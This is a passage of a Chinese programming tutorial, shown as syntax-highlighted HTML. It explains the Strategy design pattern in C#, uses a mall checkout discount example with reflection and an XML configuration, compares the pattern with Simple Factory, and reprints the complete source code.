punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>DefaultView<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                cbxType<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>dr<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            cbxType<span class="token punctuation">.</span>SelectedIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnOk_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//实例化一个上下文对象</span>            CashContext cc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//根据用户的选项，查询用户选择项的相关行</span>            DataRow dr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DataRow<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ds<span class="token punctuation">.</span>Tables<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">Select</span><span class="token punctuation">(</span><span class="token string">"name='"</span> <span class="token operator">+</span> cbxType<span class="token punctuation">.</span>SelectedItem<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//声明一个参数的对象数组</span>            <span class="token keyword">object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//若有参数，则将其分割成字符串数组，用于实例化时所用的参数</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dr<span class="token punctuation">[</span><span class="token string">"para"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span>                args <span class="token operator">=</span> dr<span class="token punctuation">[</span><span class="token string">"para"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//通过反射实例化出相应的算法对象</span>            cc<span class="token punctuation">.</span><span class="token function">setBehavior</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CashSuper<span class="token punctuation">)</span>Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span><span class="token string">"商场管理软件"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span><span class="token string">"商场管理软件."</span> <span class="token operator">+</span> dr<span class="token punctuation">[</span><span class="token string">"class"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">false</span><span class="token punctuation">,</span> BindingFlags<span class="token punctuation">.</span>Default<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> totalPrices <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            totalPrices <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">GetResult</span><span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtPrice<span class="token punctuation">.</span>Text<span class="token punctuation">)</span> <span class="token operator">*</span> Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtNum<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            total <span class="token operator">=</span> total <span class="token operator">+</span> totalPrices<span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">"单价："</span> <span class="token operator">+</span> txtPrice<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" 数量："</span> <span class="token operator">+</span> txtNum<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" "</span><span class="token operator">+</span>cbxType<span class="token punctuation">.</span>SelectedItem<span class="token operator">+</span> <span class="token string">" 合计："</span> <span class="token operator">+</span> totalPrices<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnClear_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            total <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            txtPrice<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>            txtNum<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashAcceptType.xml</strong>：</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CashAcceptType</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>正常收费<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashNormal<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>满300返100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashReturn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>300,100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>满200返50<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashReturn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>200,50<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>打8折<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashRebate<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>0.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>打7折<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashRebate<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>0.7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CashAcceptType</span><span class="token punctuation">></span></span></code></pre><p><strong>测试结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/策略模式/策略+反射测试结果展示.png" alt="策略+反射测试结果展示"></center><h1 id="策略模式与简单工厂模式的区别"><a href="#策略模式与简单工厂模式的区别" class="headerlink" title="策略模式与简单工厂模式的区别"></a>策略模式与简单工厂模式的区别</h1><p><strong>从组成对象来说</strong>：</p><ul><li><p>简单工厂模式：抽象商品角色、具体商品角色、简单工厂角色</p></li><li><p>策略模式：抽象策略角色、具体策略角色、上下文角色(环境角色)</p></li></ul><p><strong>从角色之间得关系来说</strong>：</p><ul><li>抽象策略角色与上下文角色的关系是<strong>聚合关系</strong></li><li>抽象商品角色与简单工厂角色之间是<strong>依赖关系</strong></li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《大话设计模式》</li><li>《设计模式精解及面试攻略》</li></ul><h2 id="策略与简单工厂集合完整源码"><a href="#策略与简单工厂集合完整源码" class="headerlink" title="策略与简单工厂集合完整源码"></a>策略与简单工厂集合完整源码</h2><p><strong>CashContext.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//现金收取工厂</span>    <span class="token keyword">class</span> <span class="token class-name">CashContext</span>    <span class="token punctuation">{</span>        CashSuper cs <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//根据条件返回相应的对象</span>        <span class="token keyword">public</span> <span class="token function">CashContext</span><span class="token punctuation">(</span><span class="token keyword">string</span> type<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">"正常收费"</span><span class="token punctuation">:</span>                    CashNormal cs0 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashNormal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cs <span class="token operator">=</span> cs0<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"满300返100"</span><span class="token punctuation">:</span>                    CashReturn cr1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashReturn</span><span class="token punctuation">(</span><span class="token string">"300"</span><span class="token punctuation">,</span> <span class="token string">"100"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cs <span class="token operator">=</span> cr1<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"打8折"</span><span class="token punctuation">:</span>                    CashRebate cr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashRebate</span><span class="token punctuation">(</span><span class="token string">"0.8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cs <span class="token operator">=</span> cr2<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">GetResult</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> cs<span class="token punctuation">.</span><span class="token function">acceptCash</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashNormal.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//正常收费，继承CashSuper</span>    <span class="token keyword">class</span> <span class="token class-name">CashNormal</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> money<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashRebate.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//打折收费，继承CashSuper</span>    <span class="token keyword">class</span> <span class="token class-name">CashRebate</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyRebate <span class="token operator">=</span> 1d<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//初始化时，必需要输入折扣率,如八折，就是0.8</span>        <span class="token keyword">public</span> <span class="token function">CashRebate</span><span class="token punctuation">(</span><span class="token keyword">string</span> moneyRebate<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyRebate <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyRebate<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> money <span class="token operator">*</span> moneyRebate<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashReturn.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//返利收费，继承CashSuper</span>    <span class="token keyword">class</span> <span class="token class-name">CashReturn</span> <span class="token punctuation">:</span> CashSuper    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyCondition <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">double</span> moneyReturn <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//初始化时必须要输入返利条件和返利值，比如满300返100，则moneyCondition为300，moneyReturn为100</span>        <span class="token keyword">public</span> <span class="token function">CashReturn</span><span class="token punctuation">(</span><span class="token keyword">string</span> moneyCondition<span class="token punctuation">,</span> <span class="token keyword">string</span> moneyReturn<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyCondition <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyCondition<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>moneyReturn <span class="token operator">=</span> <span class="token keyword">double</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>moneyReturn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">double</span> result <span class="token operator">=</span> money<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//若大于返利条件，则需要减去返利值</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>money <span class="token operator">>=</span> moneyCondition<span class="token punctuation">)</span>                result <span class="token operator">=</span> money <span class="token operator">-</span> Math<span class="token punctuation">.</span><span class="token function">Floor</span><span class="token punctuation">(</span>money <span class="token operator">/</span> moneyCondition<span class="token punctuation">)</span> <span class="token operator">*</span> moneyReturn<span class="token punctuation">;</span>            <span class="token keyword">return</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashSuper.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//现金收取父类</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">CashSuper</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//抽象方法：收取现金，参数为原价，返回为当前价</span>        <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">double</span> <span class="token function">acceptCash</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>Form1.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//策略对象的的创建在上下文类中完成，即策略对象的创建是对用户保密的</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Form1</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//客户端窗体程序（主要部分）</span>        <span class="token keyword">double</span> total <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnOk_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//利用简单工厂模式根据下拉选择框，生成相应的对象</span>            CashContext csuper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span>cbxType<span class="token punctuation">.</span>SelectedItem<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> totalPrices <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//通过多态，可以得到收取费用的结果</span>            totalPrices <span class="token operator">=</span> csuper<span class="token punctuation">.</span><span class="token function">GetResult</span><span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtPrice<span class="token punctuation">.</span>Text<span class="token punctuation">)</span> <span class="token operator">*</span> Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtNum<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            total <span class="token operator">=</span> total <span class="token operator">+</span> totalPrices<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//展示计价结果</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">"单价："</span> <span class="token operator">+</span> txtPrice<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" 数量："</span> <span class="token operator">+</span> txtNum<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" "</span>                <span class="token operator">+</span> cbxType<span class="token punctuation">.</span>SelectedItem <span class="token operator">+</span> <span class="token string">" 合计："</span> <span class="token operator">+</span> totalPrices<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnClear_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            total <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            txtPrice<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>            txtNum<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0"</span><span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashAcceptType.xml</strong>：</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CashAcceptType</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>正常收费<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashNormal<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>满300返100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashReturn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>300,100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>满200返50<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashReturn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>200,50<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>打8折<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashRebate<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>0.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>打7折<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashRebate<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>0.7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CashAcceptType</span><span class="token punctuation">></span></span></code></pre><h2 id="策略-反射完整源码"><a href="#策略-反射完整源码" class="headerlink" title="策略+反射完整源码"></a>策略+反射完整源码</h2><p><strong>CashSuper.cs</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">CashSuper</span>    <span class="token 